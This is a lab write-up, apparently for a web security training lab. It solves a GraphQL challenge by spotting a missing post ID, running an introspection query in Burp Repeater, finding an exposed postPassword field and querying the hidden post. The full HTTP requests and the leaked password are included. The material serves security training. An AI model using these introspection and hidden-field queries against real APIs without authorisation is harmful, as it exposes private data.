## Accessing private GraphQL posts

The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password.

## Notes

- /graphql/v1

## Resume

1. Identify GraphQL usage
2. Enumerate blog posts
3. Detect missing post ID
4. Abuse GraphQL introspection
5. Discover hidden field
6. Query hidden post
7. Extract password

## Solve

Browse the blog website while proxying traffic through Burp.

In Burp HTTP history, locate the GraphQL request:

```http
POST /graphql/v1 HTTP/2
Host: 0afb00a303bad6f481ba9e82009000cd.web-security-academy.net
```

Inspect the response.

Notice that blog posts are returned with sequential IDs:

```json
[
  { "id": "1" },
  { "id": "2" },
  { "id": "4" },
  { "id": "5" }
]
```

Post ID `3` is missing.

This strongly suggests the existence of a hidden blog post.

Send the request to Burp Repeater.

Right-click inside the request editor:

```text
GraphQL → Set introspection query
```

Burp automatically inserts a GraphQL introspection query.

Send the request.

The response reveals the GraphQL schema.

Inside the schema, notice that the `BlogPost` type exposes a sensitive field:

```graphql
postPassword
```

This field is not used in the front-end application but is still accessible through GraphQL.

Go back to the original GraphQL request.

Open the GraphQL tab in Burp Repeater.

Modify the variable:

```json
{
  "id": 3
}
```

Then add the hidden field to the query:

```graphql
query getBlogPost($id: Int!) {
  getBlogPost(id: $id) {
    id
    title
    author
    postPassword
  }
}
```

Final request:

```http
POST /graphql/v1 HTTP/2
Host: 0afb00a303bad6f481ba9e82009000cd.web-security-academy.net
Content-Type: application/json

{
  "query":"query getBlogPost($id: Int!) { getBlogPost(id: $id) { id title author postPassword } }",
  "variables":{
    "id":3
  }
}
```

Send the request.

The response now contains the hidden password:

```json
{
  "data": {
    "getBlogPost": {
      "id": "3",
      "title": "...",
      "author": "...",
      "postPassword": "8ldlbblgwn6ibd7jf8gaxgvgw9e6hblt"
    }
  }
}
```

Copy the value of:

```json
"postPassword":"8ldlbblgwn6ibd7jf8gaxgvgw9e6hblt"
```